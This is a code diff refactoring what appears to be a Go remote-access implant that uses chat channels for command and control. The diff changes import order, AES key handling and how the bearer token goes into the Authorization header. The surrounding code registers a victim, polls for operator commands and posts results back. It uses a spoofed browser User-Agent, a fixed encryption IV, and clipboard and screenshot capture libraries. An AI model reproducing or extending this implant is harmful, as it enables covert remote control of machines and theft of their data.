@@ -9,9 +9,6 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
-	"github.com/atotto/clipboard"
-	"github.com/kbinani/screenshot"
-	"golang.org/x/sys/windows"
 	"image/png"
 	"io"
 	"io/ioutil"
@@ -30,6 +27,10 @@ import (
 	"syscall"
 	"time"
 	"unsafe"
+
+	"github.com/atotto/clipboard"
+	"github.com/kbinani/screenshot"
+	"golang.org/x/sys/windows"
 )
 
 //Global variables
@@ -39,9 +40,10 @@ var processed_ids []string
 var responses = "RESPONSE_CHANNEL"
 var registration = "REGISTRATION_CHANNEL"
 var commands = "COMMANDS_CHANNEL"
-var bearer = "Bearer " + "BEARERTOKEN"
+var bearer = "BEARERTOKEN"
 var token = "TOKENTOKEN"
-var key = []byte("AESKEY")
+var key = "AESKEY"
+var keyBytes = []byte(key)
 var iv = []byte("1337133713371337")
 
 type AES_CBC struct{}
@@ -896,7 +898,7 @@ func spacePad(value string, size string) string { // Pads a string for pretty fo
 }
 
 func EncryptFile(origData []byte) ([]byte, error) { // Encrypt a file
-	block, err := aes.NewCipher(key)
+	block, err := aes.NewCipher(keyBytes)
 	if err != nil {
 		return nil, err
 	}
@@ -910,7 +912,7 @@ func EncryptFile(origData []byte) ([]byte, error) { // Encrypt a file
 
 func DecryptFile(crypted []byte) (string, error) { // Decrypt a file (currently unused)
 	decodeData := []byte(crypted)
-	block, err := aes.NewCipher(key)
+	block, err := aes.NewCipher(keyBytes)
 	if err != nil {
 		return "", err
 	}
@@ -922,7 +924,7 @@ func DecryptFile(crypted []byte) (string, error) { // Decrypt a file (currently 
 }
 
 func Encrypt(origData []byte) (string, error) { // Encrypt a string
-	block, err := aes.NewCipher(key)
+	block, err := aes.NewCipher(keyBytes)
 	if err != nil {
 		return "", err
 	}
@@ -939,7 +941,7 @@ func Decrypt(crypted string) (string, error) { // decrypt a string
 	if err != nil {
 		return "", err
 	}
-	block, err := aes.NewCipher(key)
+	block, err := aes.NewCipher(keyBytes)
 	if err != nil {
 		return "", err
 	}
@@ -1543,7 +1545,7 @@ func Register(client_ID string) { // Send a message to the registration channel 
 	v.Set("text", info)
 	//pass the values to the request's body
 	req, err := http.NewRequest("POST", URL, strings.NewReader(v.Encode()))
-	req.Header.Add("Authorization", bearer)
+	req.Header.Add("Authorization", "Bearer "+bearer)
 	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0")
 	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
 	_, netError := client.Do(req)
@@ -1587,7 +1589,7 @@ func CheckCommands(t, client_ID string) { //This is the main thing, reads the co
 	v.Set("oldest", t)
 	//pass the values to the request's body
 	req, _ := http.NewRequest("POST", URL, strings.NewReader(v.Encode()))
-	req.Header.Add("Authorization", bearer)
+	req.Header.Add("Authorization", "Bearer "+bearer)
 	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0")
 	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
 	resp, netError := client.Do(req)
@@ -1938,7 +1940,7 @@ func SendResult(client_ID, job_ID, cmd_type, output string) { //Sends a response
 	//pass the values to the request's body
 	fmt.Println("Sending result...")
 	req, _ := http.NewRequest("POST", URL, strings.NewReader(v.Encode()))
-	req.Header.Add("Authorization", bearer)
+	req.Header.Add("Authorization", "Bearer "+bearer)
 	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0")
 	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
 	_, netError := client.Do(req)
